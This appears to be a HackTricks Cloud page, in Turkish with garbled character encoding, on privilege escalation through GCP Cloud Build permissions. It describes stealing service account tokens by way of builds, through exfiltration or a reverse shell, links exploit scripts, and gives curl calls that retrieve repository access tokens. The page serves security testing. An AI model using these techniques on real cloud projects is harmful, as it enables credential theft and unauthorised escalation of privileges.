# GCP - Cloudbuild Privesc

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong> ile sÄ±fÄ±rdan kahraman olmak iÃ§in AWS hackleme Ã¶ÄŸrenin<strong>!</strong></summary>

HackTricks'Ä± desteklemenin diÄŸer yollarÄ±:

* Åirketinizi HackTricks'te **reklamÄ±nÄ±zÄ± gÃ¶rmek** veya **HackTricks'i PDF olarak indirmek** iÃ§in [**ABONELÄ°K PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin
* Ã–zel [**NFT'lerden**](https://opensea.io/collection/the-peass-family) oluÅŸan koleksiyonumuz [**The PEASS Family**](https://opensea.io/collection/the-peass-family)'i keÅŸfedin
* ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katÄ±lÄ±n** veya **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)'i takip edin.
* Hacking hilelerinizi [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gÃ¶ndererek paylaÅŸÄ±n.

</details>

## cloudbuild

Cloud Build hakkÄ±nda daha fazla bilgi iÃ§in kontrol edin:

{% content-ref url="../gcp-services/gcp-cloud-build-enum.md" %}
[gcp-cloud-build-enum.md](../gcp-services/gcp-cloud-build-enum.md)
{% endcontent-ref %}

### `cloudbuild.builds.create`

Bu izinle bir **bulut yapÄ±sÄ± oluÅŸturabilirsiniz**. Cloudbuild makinesi, **varsayÄ±lan olarak cloudbuild Hizmet HesabÄ±'nÄ±n bir belirteci** olan `<PROJE_NUMARASI>@cloudbuild.gserviceaccount.com` iÃ§erir. Bununla birlikte, cloudbuild yapÄ±landÄ±rmasÄ±nda **proje iÃ§indeki herhangi bir hizmet hesabÄ±nÄ± belirtebilirsiniz**.\
Bu nedenle, makineyi sadece belirteci sunucunuza dÄ±ÅŸa aktarabilir veya **iÃ§ine ters kabuk alabilir ve belirteci kendiniz alabilirsiniz** (belirteci iÃ§eren dosya deÄŸiÅŸebilir).

Orijinal saldÄ±rÄ± betiÄŸini [**burada GitHub'ta**](https://github.com/RhinoSecurityLabs/GCP-IAM-Privilege-Escalation/blob/master/ExploitScripts/cloudbuild.builds.create.py) bulabilirsiniz (ancak belirteci nereden aldÄ±ÄŸÄ± konumu benim iÃ§in Ã§alÄ±ÅŸmadÄ±). Bu nedenle, [**bir zafiyetli ortamÄ±n oluÅŸturulmasÄ±, saldÄ±rÄ± ve temizleme iÅŸlemlerini otomatikleÅŸtiren bir betik**](https://github.com/carlospolop/gcp\_privesc\_scripts/blob/main/tests/f-cloudbuild.builds.create.sh) ve cloudbuild makinesi iÃ§inde ters kabuk almak ve [**Ã§almak iÃ§in bir python betiÄŸi**](https://github.com/carlospolop/gcp\_privesc\_scripts/blob/main/tests/f-cloudbuild.builds.create.py) bulabilirsiniz (koddan diÄŸer hizmet hesaplarÄ±nÄ± nasÄ±l belirteceÄŸinizi bulabilirsiniz)**.**

Daha detaylÄ± bir aÃ§Ä±klama iÃ§in [https://rhinosecuritylabs.com/gcp/iam-privilege-escalation-gcp-cloudbuild/](https://rhinosecuritylabs.com/gcp/iam-privilege-escalation-gcp-cloudbuild/) adresini ziyaret edin.

### `cloudbuild.builds.update`

Bu izinle **potansiyel olarak** bir bulut yapÄ±sÄ±nÄ± **gÃ¼ncelleyebilir ve hizmet hesabÄ± belirteci Ã§alabilirsiniz**. Ancak, bu yazÄ±nÄ±n yazÄ±ldÄ±ÄŸÄ± sÄ±rada bu API'yi Ã§aÄŸÄ±rmak iÃ§in herhangi bir yol bulamadÄ±m.

TODO

### `cloudbuild.repositories.accessReadToken`

Bu izinle kullanÄ±cÄ±, depoya eriÅŸmek iÃ§in kullanÄ±lan **okuma eriÅŸim belirtecini** alabilir:

{% code overflow="wrap" %}
```
```
{% endcode %}

```bash
curl -X POST \
-H "Authorization: Bearer $(gcloud auth print-access-token)" \
-H "Content-Type: application/json" \
-d '{}' \
"https://cloudbuild.googleapis.com/v2/projects/<PROJECT_ID>/locations/<LOCATION>/connections/<CONN_ID>/repositories/<repo-id>:accessReadToken"
```

### `cloudbuild.repositories.accessReadWriteToken`

Bu izinle kullanÄ±cÄ±, depoya eriÅŸmek iÃ§in kullanÄ±lan **okuma ve yazma eriÅŸim belirteci**ni alabilir:

{% code overflow="wrap" %}
```
```
{% endcode %}

```bash
curl -X POST \
-H "Authorization: Bearer $(gcloud auth print-access-token)" \
-H "Content-Type: application/json" \
-d '{}' \
"https://cloudbuild.googleapis.com/v2/projects/<PROJECT_ID>/locations/<LOCATION>/connections/<CONN_ID>/repositories/<repo-id>:accessReadWriteToken"
```

### `cloudbuild.connections.fetchLinkableRepositories`

Bu izinle, baÄŸlantÄ±nÄ±n eriÅŸimine sahip olduÄŸu depolarÄ± alabilirsiniz:

{% code overflow="wrap" %}
```bash
curl -X GET \
-H "Authorization: Bearer $(gcloud auth print-access-token)" \
"https://cloudbuild.googleapis.com/v2/projects/<PROJECT_ID>/locations/<LOCATION>/connections/<CONN_ID>:fetchLinkableRepositories"
```
{% endcode %}

<details>

<summary><strong>AWS hackleme becerilerini sÄ±fÄ±rdan kahraman seviyesine Ã¶ÄŸrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS KÄ±rmÄ±zÄ± TakÄ±m UzmanÄ±)</strong></a><strong>!</strong></summary>

HackTricks'Ä± desteklemenin diÄŸer yollarÄ±:

* Åirketinizi HackTricks'te **reklamÄ±nÄ±zÄ± gÃ¶rmek** veya **HackTricks'i PDF olarak indirmek** iÃ§in [**ABONELÄ°K PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin
* Ã–zel [**NFT'lerden**](https://opensea.io/collection/the-peass-family) oluÅŸan koleksiyonumuz [**The PEASS Family**](https://opensea.io/collection/the-peass-family)'i keÅŸfedin
* ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katÄ±lÄ±n** veya bizi **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**'da takip edin.**
* Hacking hilelerinizi **HackTricks** ve **HackTricks Cloud** github depolarÄ±na PR gÃ¶ndererek paylaÅŸÄ±n.

</details>
